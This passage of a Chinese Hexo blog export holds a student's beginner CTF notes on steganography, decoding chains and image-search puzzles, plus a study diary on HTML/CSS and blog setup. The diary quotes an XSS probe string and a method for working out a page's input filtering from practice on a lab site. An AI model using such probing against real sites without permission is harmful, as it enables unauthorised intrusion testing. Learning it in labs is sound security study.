<li>找个扫二维码的网站<br>belike：<br><a href="https://cli.im/deqr">https://cli.im/deqr</a><br>其实我有QR_Research。。但是我从来不用，都是网上现找的网站。。</li>
</ol>
<h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><ol>
<li>解压</li>
<li>由题意可知这是lsb隐写</li>
<li>用Stegsolve打开，Data Extract打开，勾选Red0&#x2F;Green0&#x2F;Blue0还有LSB First</li>
<li>Save Bin保存为txt文件</li>
</ol>
<h3 id="misc套娃"><a href="#misc套娃" class="headerlink" title="misc套娃"></a>misc套娃</h3><p>base16转字符串<br><a href="http://www.hiencode.com/base64.html">http://www.hiencode.com/base64.html</a><br>base64转字符串<br><a href="https://c.runoob.com/front-end/693/">https://c.runoob.com/front-end/693/</a><br><a href="https://base64.us/">https://base64.us/</a><br>八进制（octal）转字符串<br><a href="https://photo333.com/octal-to-text-zh.php">https://photo333.com/octal-to-text-zh.php</a><br>hex转字符串<br><a href="https://www.lddgo.net/string/hex">https://www.lddgo.net/string/hex</a><br>凯撒密码（Caesar）解密<br><del>本题位移是10</del><br><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">https://www.qqxiuzi.cn/bianma/kaisamima.php</a><br>Base32转字符串<br><del>同第一个链接</del><br>摩斯密码（morse）<br><a href="https://www.lddgo.net/encrypt/morse">https://www.lddgo.net/encrypt/morse</a><br>Base32转字符串<br><del>又是一个base32</del><br>10进制ASCII转字符串<br><a href="https://www.asciim.cn/m/tools/convert_ascii_to_string.html">https://www.asciim.cn/m/tools/convert_ascii_to_string.html</a><br>阿特巴希密码（atbash）<br><a href="http://www.metools.info/code/atbash209.html">http://www.metools.info/code/atbash209.html</a><br>字母大小写转换<br><a href="https://www.iamwawa.cn/daxiaoxie.html">https://www.iamwawa.cn/daxiaoxie.html</a></p>
<h3 id="鼠鼠的假期"><a href="#鼠鼠的假期" class="headerlink" title="鼠鼠的假期"></a>鼠鼠的假期</h3><ol>
<li>zip文件打开</li>
<li>把里面的图片拉去百度识图</li>
<li>出来一个北京BAMN coffee的和一个厦门HOUSE OF RA</li>
<li>搜索上面这两个的地址</li>
<li>提交试一试</li>
</ol>
]]></content>
      <categories>
        <category>做题记录</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>crypto</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>ROIS2023冬令营第一周学习记录</title>
    <url>/2023/01/14/ROIS2023%E5%86%AC%E4%BB%A4%E8%90%A5%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>🐏了使人大脑晕眩。。若有错误还请见谅。。（此处意念上表情包：没读过书很抱歉.jpg<br>正在研究给blog加留言区的方法（已完成）<br>正在研究给blog加访问限制的方法（已完成）</p>
<span id="more"></span>

<p>1.11-1.12安装了VMware和Ubuntu，本来想要等博客搭建好了就记录安装过程出现中的小问题，万万没想到博客搭建了两天😅。。现在不太记得安装细节了，有缘再补吧</p>
<p>btw，为了写这篇blog还学了但MarkDown语法，虽然md走简洁风语法不多，然而本人本就不富裕的脑容量还是雪上加霜了orz。</p>
<p>再次btw，虽然是学习日记但是跟个人吐槽区别不大啦其实🤣都不知道在写什么</p>
<h1 id="2023-x2F-01-x2F-14"><a href="#2023-x2F-01-x2F-14" class="headerlink" title="2023&#x2F;01&#x2F;14"></a>2023&#x2F;01&#x2F;14</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="前端三件套HTML-x2F-CSS-x2F-JavaScript关系："><a href="#前端三件套HTML-x2F-CSS-x2F-JavaScript关系：" class="headerlink" title="前端三件套HTML&#x2F;CSS&#x2F;JavaScript关系："></a>前端三件套HTML&#x2F;CSS&#x2F;JavaScript关系：</h3><p>（引用自：<a href="https://zhuanlan.zhihu.com/p/86270957">https://zhuanlan.zhihu.com/p/86270957</a>）</p>
<blockquote>
<p><strong>HTML是用来标记内容的（重在内容组织上）</strong></p>
</blockquote>
<blockquote>
<p>HTML是超文本标记语言的简称，它是一种不严谨的、简单的标识性语言。它用各种标签将页面中的元素组织起来，告诉浏览器该如何显示其中的内容。</p>
</blockquote>
<blockquote>
<p>为什么说HTML是不严谨的呢？因为HTML标签即使不闭合，也并不会影响页面内容的组织。</p>
</blockquote>
<blockquote>
<p><strong>CSS是用来修饰内容样式的（重在内容样式美化展示上）</strong></p>
</blockquote>
<blockquote>
<p>CSS是层叠样式表的简称，它用来表现HTML文件样式的，简单说就是负责HTML页面中元素的展现及排版。</p>
</blockquote>
<blockquote>
<p><strong>JavaScript是用来做交互的</strong></p>
</blockquote>
<blockquote>
<p>JavaScript是一种脚本语言，即可以运行在客户端也能运行在服务器端。JavaScript的解释器就是JS引擎，JS引擎是浏览器的一部分。而JavaScript主要是用来扩展文档交互能力的，使静态的HTML具有一定的交互行为（比如表单提交、动画特效、弹窗等）。</p>
</blockquote>
<p>看到有人说：HTML是骨架，CSS是皮肤，JS是肌肉。确实很形象。。</p>
<h3 id="HTML-x2F-CSS-x2F-JavaScript学习"><a href="#HTML-x2F-CSS-x2F-JavaScript学习" class="headerlink" title="HTML&#x2F;CSS&#x2F;JavaScript学习"></a>HTML&#x2F;CSS&#x2F;JavaScript学习</h3><p>啊发现HTML的排版格式在MarkDown里也可以用。。<br>belike：<br><a href="https://linturrr.github.io/" style="text-decoration:none"><br>首页<br></a><br>↑这个链接就是用HTML的&lt; a &gt;链接语法写的（应该能显示出来吧</p>
<p>看完HTML部分，我有个严峻的问题。。怎么做到记住怎么多用法的，用一次查一次参考手册吗</p>
<h3 id="编写一个主页！"><a href="#编写一个主页！" class="headerlink" title="编写一个主页！"></a>编写一个主页！</h3><p>乱写看看流程主要是</p>
<p>本来打算下载vscode的，然而很不幸本人刚好有Sublime Text3，能凑合着用就不下了<br>（btw后来还是下了</p>
<ol>
<li>首先CTRL N创建一个新文件，然后CTRL S命名并且以html后缀保存</li>
<li>输入&lt;h 然后选html的那个，Sublime就会自动把html的框架补全</li>
<li>然后在tltle里填上标题，再补充一点花里胡哨的，一个全新的赛博垃圾就铛铛出炉！它跟别的垃圾不一样。。它是本人亲手创造的垃圾。。是垃圾中的垃圾。。。。。。。。。。。。。</li>
<li>做了一个按钮配了一点阴影和鼠标上去会出字的效果。。</li>
<li>过程中遇到问题：我的背景是渐变色45deg，结果我渐变色铺不满。。后来换成90deg铺满了。。</li>
</ol>
<p>放一下代码吧。。。好简陋emmmmmm</p>
<p><strong>HTML</strong></p>
<pre><code>    &lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
&lt;!--这玩意是控制网页的编码格式 utf-8 国际性编码--&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;style2.css&quot;&gt;
&lt;!--这里要来个css修饰一下主页！！！用link--&gt;
    &lt;title&gt;一个赛博垃圾&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class=&quot;header&quot;&gt;
        &lt;font size=&quot;7&quot;&gt;Welcome！&lt;/font&gt;
    &lt;/div&gt;
    &lt;div class=&quot;passage&quot;&gt;
        &lt;font size=&quot;5&quot;&gt;这里是林涂！&lt;/font&gt;
    &lt;/div&gt;
    &lt;div&gt;
        &lt;a href=&quot;https://linturrr.github.io/&quot; class=&quot;button&quot;&gt;Blog&lt;/a&gt;
    &lt;/div&gt;
    &lt;div class=&quot;ff&quot;&gt;
        &lt;p&gt;拳打脚踢！飞来飞去！&lt;/p&gt;
        &lt;p&gt;蹦蹦跳跳！蹦蹦跳跳！&lt;/p&gt;
        &lt;p&gt;飞翔！自由飞翔！&lt;/p&gt;
        &lt;p&gt;飞累了！&lt;/p&gt;
        &lt;p&gt;吃饭！躺下！&lt;/p&gt;
        &lt;p&gt;休息好了！&lt;/p&gt;
        &lt;p&gt;继续发疯！&lt;/p&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p><strong>CSS</strong></p>
<pre><code>    body&#123;
    text-align: center;/*居中*/
    background: linear-gradient(90deg,#9370D8,#FFC0CB,#E0FFFF,#7FFFD4);/*来点渐变色*/
&#125;

.header&#123;
        padding-bottom: 75px;/*底部填充*/
        padding-top: 50px;/*顶部填充*/
    &#125;
.passage&#123;
        padding-bottom: 20px;
        padding-top: 25px;
    &#125;
.button &#123;
    background: linear-gradient(45deg,#FFC0CB,#B0E0E6,	#F5F5DC);
    color: teal;
    border: none;
    padding: 3px 15px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
    margin: 4px 2px;
    cursor: pointer;
    border-radius: 8px;
    box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24),0 17px 50px 0 rgba(0,0,0,0.19);/*阴影*/
&#125;
.button &#123;
    transition: all 0.3s ease;
&#125;

.button:hover &#123;
    transform: rotate(360deg);
&#125;
.button:hover:after &#123;
    text-align: center;
    content: &quot;间歇性发疯！&quot;;
    position: absolute;
    top: 50;
    left: 50;
    width: 100%;
    height: 50%;
    color: black;
    background:(45deg,#FFC0CB,#B0E0E6,	#F5F5DC);
&#125;
.ff&#123;
    color: maroon;
&#125;
</code></pre>
<p>真的很简陋。。。。。但是有努力过的。。</p>
<p>放一下我做的两个文件。。感兴趣的可以去下载来看看（真的会有人想看垃圾吗。。<br><a href="https://github.com/LinTurrr/A_Useless_Thing.git">一个垃圾捏。。</a></p>
<h1 id="2023-x2F-01-x2F-15"><a href="#2023-x2F-01-x2F-15" class="headerlink" title="2023&#x2F;01&#x2F;15"></a>2023&#x2F;01&#x2F;15</h1><p>早上起来一看主队又在梦游了，苦中作乐安慰自己起码没有和隔壁一起惨剧🙏<br>联赛有机会？无所谓，我会出手👊👊👊</p>
<p>今天写完了wp，打算去做CryptoHack的题，打开一看页面分外熟悉，才想起来我曾经三进三出CryptoHack。。<br><del>原因是因为看不懂英语</del><br><del>救救文盲！！！</del></p>
<p>wp写隔壁了。。</p>
<hr>
<p>研究添加blog评论区ing…</p>
<ol>
<li>首先先注册一个LearnCloud账号</li>
<li>应用&gt;创建应用&gt;开发版，不花钱&gt;设置&gt;安全中心绑定域名&gt;应用凭证记下AppID和AppKey</li>
<li>打开主题配置文件，找到comments栏目并开启valine（enable: false改成true）。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Valine</span><br><span class="line"># For more information: https://valine.js.org, https://github.com/xCss/Valine</span><br><span class="line">valine:</span><br><span class="line">  enable: true</span><br><span class="line">  appid: # 输入你的 appid</span><br><span class="line">  appkey: # 输入你的 appkey</span><br><span class="line">  notify: true # Mail notifier</span><br><span class="line">  verify: false # Verification code</span><br><span class="line">  placeholder: 输入你的评论\n昵称为必填项目 # Comment box placeholder</span><br><span class="line">  avatar: mm # Gravatar style</span><br><span class="line">  guest_info: nick,mail,link # Custom comment header</span><br><span class="line">  pageSize: 3 # Pagination size</span><br><span class="line">  language:  zh-cn</span><br><span class="line">  visitor: true # Article reading statistic</span><br><span class="line">  comment_count: true # If false, comment count will only be displayed in post page, not in home page</span><br><span class="line">  recordIP: true # Whether to record the commenter IP</span><br><span class="line">  serverURLs: # When the custom domain name is enabled, fill it in here (it will be detected automatically by default, no need to fill in)</span><br></pre></td></tr></table></figure></li>
<li><code>$ hexo new page guestbook</code>添加一个新的页面</li>
<li>进入 source&#x2F;guestbook&#x2F;index.md。加入你想显示的内容，如：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: guestbook</span><br><span class="line">date: 2023-01-15 20:34:53</span><br><span class="line">---</span><br><span class="line"># Welcome！</span><br><span class="line"></span><br><span class="line">&gt; 欢迎在这里留言！</span><br></pre></td></tr></table></figure></li>
<li>打开主题配置文件，找到menu栏目，添加留言板功能：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  guestbook: /guestbook/ || fa fa-book</span><br></pre></td></tr></table></figure></li>
<li>更改 themes&#x2F;next&#x2F;languages 下对应语言的翻译。例如中文的<code>zh-CN.yml</code>文件：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  guestbook: 留言板</span><br></pre></td></tr></table></figure></li>
<li><code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</code></li>
</ol>
<h1 id="2023-x2F-01-x2F-17"><a href="#2023-x2F-01-x2F-17" class="headerlink" title="2023&#x2F;01&#x2F;17"></a>2023&#x2F;01&#x2F;17</h1><p>昨天没读书。。就解了[Week1]Aniely。。。</p>
<h3 id="给博客加密方式"><a href="#给博客加密方式" class="headerlink" title="给博客加密方式"></a>给博客加密方式</h3><p>首先，安装插件<br>npm install hexo-blog-encrypt</p>
<p>然后再在需要加密的文章信息头处加上<br><code>password: hello</code><br>复杂一点的可以是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password: 密码</span><br><span class="line">abstract: 摘要捏</span><br><span class="line">message: 密码在这里输捏</span><br><span class="line">wrong_pass_message: 不会吧不会吧不会这都不对吧</span><br></pre></td></tr></table></figure>
<hr>
<p>今天去做Introduction to CryptoHack的剩下三题了，wp写隔壁</p>
<hr>
<p>在读Modern Cryptanalysis，很不幸本人是个文盲看不懂英文，不过碰巧年前我充了彩云小译的VIP。。虽然翻得很烂但是还是可以凑合用用。。先翻了一部分（目录至第76页），如果有需要的可以来找我要。。。</p>
<h1 id="2023-x2F-01-x2F-18"><a href="#2023-x2F-01-x2F-18" class="headerlink" title="2023&#x2F;01&#x2F;18"></a>2023&#x2F;01&#x2F;18</h1><p>xss，没学过，不会做，找点题来练练手<br>闯关网址<a href="http://test.xss.tv/">http://test.xss.tv</a><br>wp写隔壁了</p>
<blockquote>
<p>在测试过程中，有哪些东西是我们可以利用来猜测与判断的：</p>
</blockquote>
<blockquote>
<p>网页页面的变化；<br>审查网页元素；<br>查看网页源码；<br>如果是白盒测试，还可以进行代码审计。</p>
</blockquote>
<blockquote>
<p>一个好用的xss测试代码：&lt;script “ ‘Oonn&gt;，方便我们测试网页后台对输入语句的过滤规则。利用该语句输入后，审查源码，猜测是否过滤以及过滤规则是什么。</p>
</blockquote>
<p>抄了个别人的解题思路，测试语句<code>&lt;script &quot; &#39;Oonn&gt;</code></p>
<p>一、通过测试语句执行情况、网页源码等，进行如下判断：</p>
<ol>
<li>判断大小于号是否过滤与转义；</li>
<li>判断单双引号是否过滤与转义；</li>
<li>判断关键字是否过滤与转义；</li>
<li>判断大小写是否转化；</li>
<li>判断语句闭合方式。</li>
</ol>
<p>二、额外地，可以分析是否存在其他注入点。<br>三、根据判断结果，灵活构造语句与利用绕过规则。</p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>第一篇博客test</title>
    <url>/2023/01/12/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2test/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="都说了是hello怎么还能输错啊😇" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="8c263c0b1c9e810c003c60d18c1e22b40f4704d976c83373bbe1f044cb123c8c"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is hello</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
